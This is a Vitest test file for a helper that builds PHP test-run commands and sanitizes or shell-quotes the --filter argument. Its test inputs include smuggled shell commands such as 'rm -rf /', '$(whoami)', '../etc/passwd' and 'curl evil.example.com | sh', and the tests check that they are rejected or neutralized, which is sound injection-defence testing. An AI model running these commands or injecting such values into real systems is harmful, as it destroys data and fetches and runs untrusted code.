import { describe, expect, it } from "vitest";
import {
  phpTestRunCommand,
  sanitizePhpTestFilter,
  shellQuotePhpTestFilter,
} from "./phpTestCommand";

describe("sanitizePhpTestFilter", () => {
  it("keeps method and class names made of word characters", () => {
    expect(sanitizePhpTestFilter("testItWorks")).toBe("testItWorks");
    expect(sanitizePhpTestFilter("InvoiceServiceTest")).toBe(
      "InvoiceServiceTest",
    );
    expect(sanitizePhpTestFilter("it_does_something")).toBe(
      "it_does_something",
    );
  });

  it("rejects filters that contain shell metacharacters", () => {
    expect(sanitizePhpTestFilter("foo; rm -rf /")).toBeNull();
    expect(sanitizePhpTestFilter("foo$(whoami)")).toBeNull();
    expect(sanitizePhpTestFilter("foo`whoami`")).toBeNull();
    expect(sanitizePhpTestFilter("foo && bar")).toBeNull();
    expect(sanitizePhpTestFilter("foo|bar")).toBeNull();
    expect(sanitizePhpTestFilter("a b")).toBeNull();
    expect(sanitizePhpTestFilter("../etc/passwd")).toBeNull();
    expect(sanitizePhpTestFilter("")).toBeNull();
  });
});

describe("phpTestRunCommand", () => {
  it("builds an artisan test command with a sanitized --filter", () => {
    expect(
      phpTestRunCommand({ filter: "testItWorks", runner: "artisan" }),
    ).toBe("php artisan test --filter testItWorks");
  });

  it("builds a phpunit command with a sanitized --filter", () => {
    expect(
      phpTestRunCommand({ filter: "InvoiceServiceTest", runner: "phpunit" }),
    ).toBe("vendor/bin/phpunit --filter InvoiceServiceTest");
  });

  it("runs the whole class without a --filter when filter is null", () => {
    expect(phpTestRunCommand({ filter: null, runner: "artisan" })).toBe(
      "php artisan test",
    );
    expect(phpTestRunCommand({ filter: null, runner: "phpunit" })).toBe(
      "vendor/bin/phpunit",
    );
  });

  it("returns null when the filter cannot be safely sanitized", () => {
    expect(
      phpTestRunCommand({ filter: "foo; rm -rf /", runner: "artisan" }),
    ).toBeNull();
    expect(
      phpTestRunCommand({ filter: "foo$(whoami)", runner: "phpunit" }),
    ).toBeNull();
  });

  it("never lets a malicious filter reach the command string", () => {
    const command = phpTestRunCommand({
      filter: "test; curl evil.example.com | sh",
      runner: "artisan",
    });

    expect(command).toBeNull();
  });
});

describe("shellQuotePhpTestFilter", () => {
  it("wraps a plain Pest description in single quotes", () => {
    expect(shellQuotePhpTestFilter("adds two numbers")).toBe(
      "'adds two numbers'",
    );
  });

  it("escapes embedded single quotes with the POSIX '\\'' idiom", () => {
    expect(shellQuotePhpTestFilter("it's ok")).toBe("'it'\\''s ok'");
    // Multiple quotes and a quote at the boundaries.
    expect(shellQuotePhpTestFilter("'lead and trail'")).toBe(
      "''\\''lead and trail'\\'''",
    );
  });

  it("treats shell metacharacters as literal text inside single quotes", () => {
    expect(
      shellQuotePhpTestFilter("a $VAR `cmd` $(sub); rm -rf / && x | y"),
    ).toBe("'a $VAR `cmd` $(sub); rm -rf / && x | y'");
    expect(shellQuotePhpTestFilter("../etc/passwd")).toBe("'../etc/passwd'");
  });

  it("rejects descriptions containing a newline or carriage return", () => {
    expect(shellQuotePhpTestFilter("line one\nline two")).toBeNull();
    expect(shellQuotePhpTestFilter("trailing\r")).toBeNull();
  });

  it("rejects descriptions containing other control characters", () => {
    expect(shellQuotePhpTestFilter("tab\there")).toBeNull();
    expect(shellQuotePhpTestFilter("bell\x07here")).toBeNull();
    expect(shellQuotePhpTestFilter("nul\x00byte")).toBeNull();
    expect(shellQuotePhpTestFilter("del\x7fchar")).toBeNull();
    expect(shellQuotePhpTestFilter("esc\x1bseq")).toBeNull();
  });

  it("rejects an empty description", () => {
    expect(shellQuotePhpTestFilter("")).toBeNull();
  });
});

describe("phpTestRunCommand with a description (Pest) filter", () => {
  it("builds an artisan command with a safely quoted --filter", () => {
    expect(
      phpTestRunCommand({
        filter: "adds two numbers",
        match: "description",
        runner: "artisan",
      }),
    ).toBe("php artisan test --filter 'adds two numbers'");
  });

  it("builds a phpunit command with a safely quoted --filter", () => {
    expect(
      phpTestRunCommand({
        filter: "it works",
        match: "description",
        runner: "phpunit",
      }),
    ).toBe("vendor/bin/phpunit --filter 'it works'");
  });

  it("escapes a single quote inside a Pest description", () => {
    expect(
      phpTestRunCommand({
        filter: "it's ok",
        match: "description",
        runner: "artisan",
      }),
    ).toBe("php artisan test --filter 'it'\\''s ok'");
  });

  it("neutralizes shell metacharacters in a Pest description", () => {
    expect(
      phpTestRunCommand({
        filter: "boom; rm -rf / && curl evil | sh `id` $(whoami)",
        match: "description",
        runner: "artisan",
      }),
    ).toBe(
      "php artisan test --filter 'boom; rm -rf / && curl evil | sh `id` $(whoami)'",
    );
  });

  it("returns null when a Pest description contains a newline", () => {
    expect(
      phpTestRunCommand({
        filter: "evil\nrm -rf /",
        match: "description",
        runner: "artisan",
      }),
    ).toBeNull();
  });

  it("returns null when a Pest description contains a control character", () => {
    expect(
      phpTestRunCommand({
        filter: "evil\tname",
        match: "description",
        runner: "phpunit",
      }),
    ).toBeNull();
  });

  it("still uses the identifier allow-list for PHPUnit method/class targets", () => {
    expect(
      phpTestRunCommand({
        filter: "testItWorks",
        match: "identifier",
        runner: "artisan",
      }),
    ).toBe("php artisan test --filter testItWorks");
    expect(
      phpTestRunCommand({
        filter: "spaced name",
        match: "identifier",
        runner: "artisan",
      }),
    ).toBeNull();
  });

  it("defaults to the identifier allow-list when no match mode is given", () => {
    expect(
      phpTestRunCommand({ filter: "InvoiceServiceTest", runner: "phpunit" }),
    ).toBe("vendor/bin/phpunit --filter InvoiceServiceTest");
    expect(
      phpTestRunCommand({ filter: "adds two numbers", runner: "phpunit" }),
    ).toBeNull();
  });

  it("runs the whole class without a --filter even in description mode", () => {
    expect(
      phpTestRunCommand({ filter: null, match: "description", runner: "artisan" }),
    ).toBe("php artisan test");
  });
});
